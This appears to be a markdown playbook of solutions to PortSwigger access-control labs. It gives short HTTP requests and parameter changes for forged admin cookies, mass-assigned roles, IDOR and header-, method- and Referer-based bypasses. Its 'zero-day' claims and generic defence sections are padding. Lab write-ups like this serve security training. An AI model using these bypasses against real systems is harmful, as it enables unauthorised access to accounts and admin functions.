---
name: "Access Control — Complete Deep Dive"
description: "Complete PortSwigger deep-dive with exact payloads for every lab variant including zero-day techniques"
domain: cybersecurity
subdomain: bug-hunting
version: "1.0.0"
category: "bug-hunting/deep-dive-labs"
tags: [portswigger, deep-dive, exploitation, zero-day, lab-solutions]
mitre_attack: ["T1078"]
tools: [burp-suite, curl, sqlmap, ffuf, python, hashcat, ysoserial]
difficulty: "advanced"
---

# Access Control — Complete Deep Dive

> **Deep-Dive Lab Playbook** — Every PortSwigger lab variant with exact payloads,
> bypass techniques, and zero-day extensions. 🟢 Apprentice 🟡 Practitioner 🔴 Expert

## When to Use
- BSCP certification prep
- Real-world bug bounty hunting
- Building exploitation chains
- Understanding bypass techniques

## Prerequisites
- Burp Suite Professional
- Burp Collaborator / interactsh
- Browser with proxy configured


## Workflow
### Phase 1: Reconnaissance
- Identify input vectors, parameters, and application behavior.
### Phase 2: Exploitation
- Apply standard lab payloads.
### Phase 3: Zero-Day Escalation
- Fuzz filters, bypass WAFs, and chain with other vulns.

## Lab Playbooks

### Lab 1: Unprotected admin 🟢 APPRENTICE
`/robots.txt` reveals `/administrator-panel`. Navigate directly.
---

### Lab 2: Unpredictable URL admin 🟢 APPRENTICE
Check page source/JS for leaked admin URL: `adminPanelTag.setAttribute('href', '/admin-abcd1234');`
---

### Lab 3: Role via request parameter 🟢 APPRENTICE
```http
Cookie: session=xxx; Admin=true
```
Change `Admin=false` to `Admin=true` or `roleid=2`.
---

### Lab 4: Role modified in profile 🟢 APPRENTICE
```json
{"email":"a@b.com","roleid":2}
```
Add `roleid` to the profile update JSON request (mass assignment).
---

### Lab 5: User ID in request param 🟢 APPRENTICE
```http
GET /my-account?id=carlos HTTP/1.1
```
---

### Lab 6: Unpredictable user IDs 🟡 PRACTITIONER
Find victim's GUID in blog posts/comments, then: `/my-account?id=VICTIM-GUID`.
---

### Lab 7: Data leakage in redirect 🟡 PRACTITIONER
```http
GET /my-account?id=carlos HTTP/1.1
```
Response body contains API key BEFORE the 302 redirect fires.
---

### Lab 8: Password disclosure 🟡 PRACTITIONER
`/my-account?id=administrator` — password visible in masked input field (view source).
---

### Lab 9: IDOR 🟢 APPRENTICE
```http
GET /download-transcript/2.txt HTTP/1.1
```
Change `1.txt` to `2.txt` etc to download other users' chat transcripts.
---

### Lab 10: URL-based AC bypass 🟡 PRACTITIONER
```http
GET /?username=carlos HTTP/1.1
X-Original-URL: /admin/delete
```
Frontend blocks `/admin/*` but backend processes `X-Original-URL` header.
---

### Lab 11: Method-based AC bypass 🟡 PRACTITIONER
```http
GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
```
Change POST to GET — access control only applied to POST method.
---

### Lab 12: Multi-step no AC on one step 🟡 PRACTITIONER
Skip to step 3 (confirmation) directly without going through protected steps 1 and 2.
---

### Lab 13: Referer-based AC 🟡 PRACTITIONER
```http
GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
Referer: https://TARGET/admin
```
Server only checks Referer contains `/admin`.
---


## Blue Team Detection
- Monitor access logs for anomalous payloads.
- Implement strict input validation and parameterized queries where applicable.
- Create WAF rules masking generic attack patterns.

## Zero-Day Research
When standard technique fails:
1. Identify the filter/WAF
2. Fuzz with Burp Intruder custom wordlists
3. Search GitHub/Twitter for new bypasses
4. Chain with other vulns for escalation
5. Try encoding variants: URL, double-URL, unicode, hex


## Key Concepts
| Concept | Description |
|---------|-------------|
| PortSwigger Vectors | Standardized approaches to vulnerability classes. |
| Payload Encoding | Modifying payloads to bypass basic string matching WAFs. |


## Output Format
```
Vulnerability Deep-Dive Report
==============================
Target Vector: [Endpoint]
Bypass Technique: [Explanation of bypass]
Payload Used: [Payload]
Impact Explanation: [Impact]
```

## 🔵 Blue Team
- Deploy robust WAF rules to detect anomalies.
- Monitor logs for unusual access patterns.

## 🛡️ Remediation & Mitigation Strategy
- **Input Validation:** Sanitize and strictly type-check all inputs.
- **Least Privilege:** Constrain component execution bounds.


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- [PortSwigger Labs](https://portswigger.net/web-security/all-labs)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [HackTricks](https://book.hacktricks.xyz/)
